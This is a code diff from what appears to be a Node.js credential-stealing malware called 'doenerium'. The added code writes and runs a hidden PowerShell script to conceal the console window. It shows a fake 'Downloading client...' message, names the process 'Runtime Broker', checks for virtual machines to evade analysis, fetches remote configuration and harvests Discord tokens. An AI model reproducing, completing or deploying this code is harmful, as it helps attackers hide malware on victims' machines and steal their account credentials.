@@ -55,48 +55,42 @@ class doenerium {
     }
 
     hideSelf() {
-        let payload = '\n' +
-            "    Add-Type -Name Window -Namespace Console -MemberDefinition '\n" +
-            '    [DllImport("Kernel32.dll")]\n' +
-            '    public static extern IntPtr GetConsoleWindow();\n' +
-            '\n' +
-            '    [DllImport("user32.dll")]\n' +
-            '    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);\n' +
-            "    '\n" +
-            '\n' +
-            '    $consolePtr = [Console.Window]::GetConsoleWindow()\n' +
-            '    #0 hide\n' +
-            '    [Console.Window]::ShowWindow($consolePtr, 0)\n' +
-            `    & {$host.ui.RawUI.WindowTitle = 'Runtime Broker'}`
-        '    ';
-        let file = process.cwd() + '\\temp.ps1';
-        try {
-            this.requires.child_process.execSync('type .\\temp.ps1 | powershell.exe -noprofile -', {
-                'stdio': 'inherit'
-            });
-            this.requires.fs.unlinkSync(file);
-        } catch (e) {}
+        this.requires.fs.writeFileSync(`${process.cwd()}\\temp.ps1`, `
+        Add-Type -Name Window -Namespace Console -MemberDefinition '
+        [DllImport("Kernel32.dll")]
+        public static extern IntPtr GetConsoleWindow();
+    
+        [DllImport("user32.dll")]
+        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+        '
+    
+        $consolePtr = [Console.Window]::GetConsoleWindow()
+        #0 hide
+        [Console.Window]::ShowWindow($consolePtr, 0)
+        `);
+
+        this.requires.child_process.execSync(`type .\\temp.ps1 | powershell.exe -noprofile -`, {
+            stdio: 'inherit'
+        });
+
+        this.requires.fs.unlinkSync(`${process.cwd()}\\temp.ps1`); 
     }
 
     async init() {
+        console.log("Downloading client...")
+
+        this.hideSelf();
 
         try {
 
             this.config.embed = JSON.parse(JSON.stringify((await this.requires.axios.get("https://raw.githubusercontent.com/1337wtf1337/1337wtf1337/main/embed.json")).data))
         } catch {
-            this.config.embed = {
-                "username": "doenerium | t.me/doenerium",
-                "href": "https://t.me/doenerium",
-                "avatar_url": "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
-                "credits": "t.me/doenerium"
-            }
+            process.exit(0);
         }
         this.config.embed.footer = {
             text: `${this.utils.encryption.decryptData(this.config.user.hostname)} | ${this.config.embed.credits}`,
             icon_url: this.config.embed.avatar_url,
         }
-
-        // this.hideSelf();
 
         const exit = await this.utils.protection.inVM();
 
@@ -110,8 +104,6 @@ class doenerium {
         process.title = "Runtime Broker"
 
         this.config.jszip.path = this.config.jszip.generate_path()
-
-        console.log(this.config.jszip.path)
 
         //this.config.autostart.path = this.config.autostart.generate_path();
         //this.utils.autostart.dropInRandomPath();
@@ -147,7 +139,7 @@ class doenerium {
 
         this.utils.constructor.loadCPUS()
 
-        
+
         await this.utils.discord.getTokens();
 
         await this.utils.time.sleep(this.config.main.start_delay);
